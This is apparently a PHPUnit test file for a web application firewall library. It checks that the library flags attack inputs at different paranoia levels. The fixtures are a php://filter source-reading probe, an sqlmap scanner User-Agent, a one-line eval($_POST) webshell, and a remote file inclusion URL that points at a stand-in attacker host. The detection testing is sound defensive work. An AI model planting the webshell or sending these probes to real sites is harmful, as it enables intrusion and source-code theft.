<?php

use Fireline\Engine\FieldInspector;
use Fireline\Extract\RequestField;
use Fireline\Normalize\Normalizer;
use Fireline\Scoring\Thresholds;
use PHPUnit\Framework\TestCase;

class ExpandedRuleCoverageTest extends TestCase
{
    public function testBlocksPhpStreamFilterProbeAtLowParanoia(): void
    {
        $result = $this->inspect('get.file', 'file=php://filter/convert.base64-encode/resource=index.php', 'low');

        $this->assertGreaterThanOrEqual(35, $result->score());
        $this->assertContains('PHP_STREAM_FILTER', array_column($result->toArray()['matches'], 'id'));
    }

    public function testBlocksScannerFingerprintAtMediumParanoia(): void
    {
        $result = $this->inspect('header.User-Agent', 'sqlmap/1.8', 'medium', 'header');

        $this->assertGreaterThanOrEqual(25, $result->score());
        $this->assertContains('SCANNER_SQLMAP', array_column($result->toArray()['matches'], 'id'));
    }

    public function testBlocksWebshellEvalPostAtHighParanoia(): void
    {
        $result = $this->inspect('post.code', '<?php eval($_POST["cmd"]); ?>', 'high');

        $this->assertGreaterThanOrEqual(18, $result->score());
        $this->assertContains('WEBSHELL_EVAL_POST_CALL', array_column($result->toArray()['matches'], 'id'));
    }

    public function testStrictRemoteFileInclusionRequiresScriptLikeUrl(): void
    {
        $probe = $this->inspect('get.page', 'page=http://evil.example/shell.php', 'strict');
        $benign = $this->inspect('get.return', 'return=http://example.com/docs', 'strict');

        $this->assertGreaterThanOrEqual(12, $probe->score());
        $this->assertContains('RFI_REMOTE_SCRIPT', array_column($probe->toArray()['matches'], 'id'));
        $this->assertLessThan(12, $benign->score());
    }

    protected function inspect(string $name, string $value, string $paranoia, string $source = 'get')
    {
        $thresholds = new Thresholds(['paranoia_level' => $paranoia]);
        $field = new RequestField($name, $value, $source);

        return (new FieldInspector($thresholds))->inspect(
            ['method' => 'GET', 'route' => '/demo'],
            $field,
            (new Normalizer())->run($value),
            false
        );
    }
}
